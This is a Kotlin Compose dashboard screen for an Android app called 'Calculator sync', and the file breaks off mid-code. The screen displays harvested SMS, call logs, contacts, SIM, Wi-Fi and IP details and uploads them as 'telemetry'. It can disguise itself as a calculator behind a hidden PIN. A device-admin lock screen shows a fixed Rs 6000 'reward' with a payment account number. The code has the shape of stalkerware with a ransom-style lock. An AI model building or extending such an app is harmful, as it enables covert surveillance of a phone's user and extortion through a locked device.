package com.example.ui.screens

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Android
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.DeleteSweep
import androidx.compose.material.icons.filled.Email
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Palette
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.PhotoLibrary
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.SatelliteAlt
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.ShieldMoon
import androidx.compose.material.icons.filled.Star
import androidx.compose.material.icons.filled.Sync
import androidx.compose.material.icons.filled.Tune
import androidx.compose.material.icons.filled.VerifiedUser
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Badge
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Divider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.data.sync.LostModeManager
import com.example.receiver.MyDeviceAdminReceiver
import com.example.ui.MainViewModel
import com.example.ui.theme.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Composable
fun DashboardScreen(
    viewModel: MainViewModel,
    hasPermissions: Boolean,
    onRequestPermissions: () -> Unit
) {
    val isSyncing by viewModel.isSyncing.collectAsState()
    val lastSyncTime by viewModel.lastSyncTime.collectAsState()
    val clearDataBeforeUpload by viewModel.clearDataBeforeUpload.collectAsState()
    val deviceInfo by viewModel.deviceInfo.collectAsState()
    val smsList by viewModel.smsList.collectAsState()
    val callLogs by viewModel.callLogs.collectAsState()
    val contacts by viewModel.contacts.collectAsState()

    val dateFormat = remember { SimpleDateFormat("MMM dd, hh:mm:ss a", Locale.getDefault()) }
    val context = LocalContext.current

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(HighDensityBackground)
            .statusBarsPadding()
            .navigationBarsPadding()
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {

            // Minimal App Header
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.weight(1f)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(44.dp)
                                .clip(CircleShape)
                                .background(HighDensityPrimary),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Security,
                                contentDescription = "Calculator sync",
                                tint = Color.White,
                                modifier = Modifier.size(22.dp)
                            )
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text(
                                text = "Calculator sync",
                                color = HighDensityOnSurface,
                                fontSize = 18.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Box(
                                    modifier = Modifier
                                        .size(8.dp)
                                        .clip(CircleShape)
                                        .background(HighDensitySuccess)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "BACKGROUND SYNC ACTIVE",
                                    color = HighDensitySuccess,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold,
                                    letterSpacing = 0.5.sp
                                )
                            }
                        }
                    }

                    IconButton(
                        onClick = { viewModel.triggerSyncAll() },
                        modifier = Modifier
                            .size(40.dp)
                            .clip(CircleShape)
                            .background(HighDensityPrimaryContainer)
                    ) {
                        if (isSyncing) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(18.dp),
                                color = HighDensityPrimary,
                                strokeWidth = 2.dp
                            )
                        } else {
                            Icon(
                                imageVector = Icons.Default.Refresh,
                                contentDescription = "Manual Cloud Sync",
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(20.dp)
                            )
                        }
                    }
                }
            }

            // Minimal Primary Action Controls (Full Sync & Hide Launcher)
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardBlue)
            ) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "CORE ACTION CONTROLS",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = HighDensityOnPrimaryContainer,
                        letterSpacing = 1.sp
                    )
                    Spacer(modifier = Modifier.height(16.dp))

                    // Toggle for Clear Before Backup
                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 12.dp),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = HighDensityPrimaryContainer)
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 14.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                modifier = Modifier.weight(1f)
                            ) {
                                Icon(
                                    imageVector = Icons.Default.DeleteSweep,
                                    contentDescription = null,
                                    tint = HighDensityOnPrimaryContainer,
                                    modifier = Modifier.size(20.dp)
                                )
                                Spacer(modifier = Modifier.width(10.dp))
                                Column {
                                    Text(
                                        text = "Clear data before upload",
                                        fontSize = 13.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = HighDensityOnPrimaryContainer
                                    )
                                    Text(
                                        text = "Purges old cloud backup prior to fresh sync",
                                        fontSize = 10.sp,
                                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.7f)
                                    )
                                }
                            }
                            Switch(
                                checked = clearDataBeforeUpload,
                                onCheckedChange = { viewModel.toggleClearDataBeforeUpload(it) },
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = HighDensityPrimary,
                                    checkedTrackColor = HighDensityCardWhite
                                )
                            )
                        }
                    }

                    // 1. Full Sync Button
                    Button(
                        onClick = { viewModel.triggerSyncAll() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(54.dp)
                            .testTag("full_sync_button"),
                        shape = RoundedCornerShape(16.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = HighDensityPrimary,
                            contentColor = Color.White
                        )
                    ) {
                        if (isSyncing) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(22.dp),
                                color = Color.White,
                                strokeWidth = 2.5.dp
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Text("SYNCING TELEMETRY...", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        } else {
                            Icon(
                                imageVector = Icons.Default.Sync,
                                contentDescription = "Full Sync",
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Text("FULL SYNC NOW", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // 1b. Direct Clear & Upload Fresh Backup Button
                    OutlinedButton(
                        onClick = { viewModel.triggerClearAndBackupNow() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(48.dp)
                            .testTag("clear_and_backup_button"),
                        shape = RoundedCornerShape(14.dp),
                        border = BorderStroke(1.dp, HighDensityPrimary.copy(alpha = 0.5f)),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary)
                    ) {
                        Icon(
                            imageVector = Icons.Default.DeleteSweep,
                            contentDescription = "Clear & Backup",
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("CLEAR & UPLOAD FRESH BACKUP", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Last Sync: ${dateFormat.format(Date(lastSyncTime))}",
                        fontSize = 11.sp,
                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.7f),
                        textAlign = TextAlign.Center
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    // 2. Lock to Calculator Vault
                    Button(
                        onClick = { viewModel.lockToCalculator() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(54.dp)
                            .testTag("lock_calculator_button"),
                        shape = RoundedCornerShape(16.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFF1E293B),
                            contentColor = Color.White
                        )
                    ) {
                        Icon(
                            imageVector = Icons.Default.Lock,
                            contentDescription = "Lock to Calculator Vault",
                            modifier = Modifier.size(22.dp)
                        )
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = "LOCK TO CALCULATOR VAULT",
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Disguises UI as a functional Calculator. Default unlock PIN: 5218=",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.8f),
                        textAlign = TextAlign.Center
                    )


                }
            }

            // Lost Phone Security & Custom Screen Lock Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, Color(0xFFD32F2F).copy(alpha = 0.4f))
            ) {
                Column(modifier = Modifier.padding(20.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Lock,
                                contentDescription = null,
                                tint = Color(0xFFD32F2F),
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "LOST PHONE LOCK & MESSAGE",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFFD32F2F),
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = Color(0xFFFFEBEE),
                            contentColor = Color(0xFFC62828)
                        ) {
                            Text(
                                text = "LOST MODE SECURITY",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    var overlayConfig by remember { mutableStateOf(LostModeManager.getOverlayConfig(context)) }

                    Text(
                        text = "Header Title & Subtitle:",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = HighDensityOnSurface
                    )
                    Spacer(modifier = Modifier.height(2.dp))
                    OutlinedTextField(
                        value = overlayConfig.title,
                        onValueChange = {
                            overlayConfig = overlayConfig.copy(title = it)
                            LostModeManager.saveOverlayConfig(context, overlayConfig)
                        },
                        label = { Text("Header Title") },
                        modifier = Modifier.fillMaxWidth().testTag("overlay_title_input"),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    OutlinedTextField(
                        value = overlayConfig.subtitle,
                        onValueChange = {
                            overlayConfig = overlayConfig.copy(subtitle = it)
                            LostModeManager.saveOverlayConfig(context, overlayConfig)
                        },
                        label = { Text("Subtitle Note") },
                        modifier = Modifier.fillMaxWidth().testTag("overlay_subtitle_input"),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    Text(
                        text = "Custom Lock Message:",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = HighDensityOnSurface
                    )
                    Spacer(modifier = Modifier.height(2.dp))
                    OutlinedTextField(
                        value = overlayConfig.message,
                        onValueChange = {
                            overlayConfig = overlayConfig.copy(message = it)
                            LostModeManager.saveOverlayConfig(context, overlayConfig)
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("lost_message_input"),
                        placeholder = { Text("Enter custom lock screen message...") },
                        singleLine = false,
                        maxLines = 3
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    Text(
                        text = "Reward Note:",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = HighDensityOnSurface
                    )
                    Spacer(modifier = Modifier.height(2.dp))
                    OutlinedTextField(
                        value = overlayConfig.rewardNote,
                        onValueChange = {
                            overlayConfig = overlayConfig.copy(rewardNote = it)
                            LostModeManager.saveOverlayConfig(context, overlayConfig)
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("reward_note_input"),
                        placeholder = { Text("REWARD: Rs 6000") },
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    Row(modifier = Modifier.fillMaxWidth()) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "Account Number for Reward:",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            OutlinedTextField(
                                value = overlayConfig.accountNumber,
                                onValueChange = {
                                    overlayConfig = overlayConfig.copy(accountNumber = it)
                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
                                },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .testTag("account_number_input"),
                                placeholder = { Text("0300-1234567") },
                                singleLine = true
                            )
                        }

                        Spacer(modifier = Modifier.width(8.dp))

                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "Owner Contact Phone:",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            OutlinedTextField(
                                value = overlayConfig.ownerPhone,
                                onValueChange = {
                                    overlayConfig = overlayConfig.copy(ownerPhone = it)
                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
                                },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .testTag("owner_phone_input"),
                                placeholder = { Text("+923001234567") },
                                singleLine = true
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Column(modifier = Modifier.fillMaxWidth()) {
                        Text(
                            text = "Device Unlock PIN:",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = HighDensityOnSurface
                        )
                        Spacer(modifier = Modifier.height(2.dp))
                        OutlinedTextField(
                            value = overlayConfig.pin,
                            onValueChange = {
                                overlayConfig = overlayConfig.copy(pin = it)
                                LostModeManager.saveOverlayConfig(context, overlayConfig)
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .testTag("unlock_pin_input"),
                            placeholder = { Text("1234") },
                            singleLine = true
                        )
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = {
                                LostModeManager.saveOverlayConfig(context, overlayConfig)
                                LostModeManager.launchLostActivity(context)
                            },
                            modifier = Modifier
                                .weight(1f)
                                .height(46.dp)
                                .testTag("preview_overlay_button"),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(imageVector = Icons.Default.Visibility, contentDescription = null, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("PREVIEW OVERLAY", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }

                        Button(
                            onClick = {
                                LostModeManager.saveOverlayConfig(context, overlayConfig)
                                LostModeManager.lockDeviceWithCustomMessage(
                                    context = context,
                                    message = overlayConfig.message,
                                    phone = overlayConfig.ownerPhone,
                                    pin = overlayConfig.pin
                                )
                            },
                            modifier = Modifier
                                .weight(1.3f)
                                .height(46.dp)
                                .testTag("trigger_lost_lock_button"),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFFC62828),
                                contentColor = Color.White
                            ),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(imageVector = Icons.Default.Lock, contentDescription = null, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("LOCK DEVICE NOW", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Static lock screen overlay with fixed Rs 6000 reward and account payment details.",
                        fontSize = 11.sp,
                        color = Color.Gray,
                        textAlign = TextAlign.Center
                    )
                }
            }

            // Device Specifications & Storage (GB) Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Android,
                                contentDescription = null,
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "DEVICE HARDWARE & STORAGE (GB)",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = HighDensityPrimaryContainer,
                            contentColor = HighDensityPrimary
                        ) {
                            Text(
                                deviceInfo?.deviceModel ?: "Android Device",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    if (deviceInfo != null) {
                        val freeGb = String.format(Locale.US, "%.2f", deviceInfo!!.freeStorageMb / 1024.0)
                        val totalGb = String.format(Locale.US, "%.2f", deviceInfo!!.totalStorageMb / 1024.0)
                        val infoUpdatedFormatted = remember(deviceInfo!!.lastUpdated) {
                            dateFormat.format(Date(deviceInfo!!.lastUpdated))
                        }

                        Text(
                            text = "Last Info Sync: $infoUpdatedFormatted",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Medium,
                            color = HighDensitySecondary
                        )

                        Spacer(modifier = Modifier.height(10.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Storage Box (GBs)
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Android, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Storage Space", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text("$freeGb GB Free", fontSize = 14.sp, fontWeight = FontWeight.ExtraBold, color = HighDensityPrimary)
                                    Text("Total: $totalGb GB", fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }

                            // Battery Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Security, contentDescription = null, tint = HighDensitySuccess, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Battery Level", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text("${deviceInfo!!.batteryLevel}%", fontSize = 14.sp, fontWeight = FontWeight.ExtraBold, color = HighDensitySuccess)
                                    Text(deviceInfo!!.chargeType, fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // SIM Carrier Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Phone, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("SIM Carrier", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(deviceInfo!!.carrierName, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    Text("SIM: ${deviceInfo!!.simState}", fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }

                            // Wi-Fi Status Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.SatelliteAlt, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Network / Wi-Fi", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(deviceInfo!!.wifiSsid, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    Text("Local IP: ${deviceInfo!!.localIp}", fontSize = 10.sp, color = HighDensitySecondary)
                                    if (deviceInfo!!.publicIp.isNotEmpty() && deviceInfo!!.publicIp != "N/A") {
                                        Text("Public IP: ${deviceInfo!!.publicIp}", fontSize = 10.sp, fontWeight = FontWeight.SemiBold, color = HighDensityPrimary)
                                    }
                                }
                            }
                        }
                    } else {
                        Text(
                            text = "Tap Full Sync to gather hardware specifications, battery status, SIM card details, and storage in GBs.",
                            fontSize = 11.sp,
                            color = HighDensitySecondary
                        )
                    }
                }
            }

            // Call Logs Telemetry Viewer Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Phone,
                                contentDescription = null,
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "REAL CALL LOGS TELEMETRY",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = HighDensityPrimaryContainer,
                            contentColor = HighDensityPrimary
                        ) {
                            Text(
                                "${callLogs.size} logs",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    if (callLogs.isEmpty()) {
                        Text(
                            text = "No call logs found on device or permission required. Grant permissions above and tap Full Sync.",
                            fontSize = 12.sp,
                            color = HighDensitySecondary,
                            modifier = Modifier.padding(vertical = 8.dp)
                        )
                    } else {
                        Column(
                            verticalArrangement = Arrangement.spacedBy(8.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            callLogs.take(10).forEach { call ->
                                Card(
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(12.dp),
                                    colors = CardDefaults.cardColors(containerColor = HighDensityBackground),
                                    border = BorderStroke(1.dp, HighDensityOutline.copy(alpha = 0.5f))
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(12.dp),
                                        horizontalArrangement = Arrangement.SpaceBetween,
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = call.name.ifBlank { call.number },
                                                fontSize = 13.sp,
                                                fontWeight = FontWeight.Bold,
                                                color = HighDensityOnSurface
                                            )
                                            Spacer(modifier = Modifier.height(2.dp))
                                            Text(
                                                text = "${call.number} • ${call.type}",
                                                fontSize = 11.sp,
                                                color = HighDensitySecondary
                                            )
                                        }
                                        Column(horizontalAlignment = Alignment.End) {
                                            Text(
                                                text = "${call.durationSeconds}s",
                                                fontSize = 11.sp,
                                                fontWeight = FontWeight.Bold,
                                                color = HighDensityPrimary
                                            )
                                            Spacer(modifier = Modifier.height(2.dp))
                                            Text(
                                                text = dateFormat.format(Date(call.timestamp)),
                                                fontSize = 10.sp,
                                                color = HighDensitySecondary
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // Comprehensive System Permissions & Access Control Center
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.VerifiedUser,
                                contentDescription = null,
                                tint = if (hasPermissions) HighDensitySuccess else HighDensityWarning,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "SYSTEM PERMISSIONS & ACCESS CENTER",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = if (hasPermissions) HighDensitySuccessContainer else HighDensityWarningContainer,
                            contentColor = if (hasPermissions) HighDensitySuccess else HighDensityWarning
                        ) {
                            Text(
                                if (hasPermissions) "All Active" else "Action Required",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    Text(
                        text = "If you mistakenly denied any permission, tap 'ALLOW' or 'GRANT' below to enable full background sync and camera/telemetry capabilities.",
                        fontSize = 11.sp,
                        color = HighDensitySecondary
                    )

                    Spacer(modifier = Modifier.height(14.dp))

                    // 1. Bulk Runtime Permissions Launcher
                    Button(
                        onClick = onRequestPermissions,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(44.dp)
                            .testTag("request_all_permissions_button"),
                        colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, modifier = Modifier.size(18.dp))
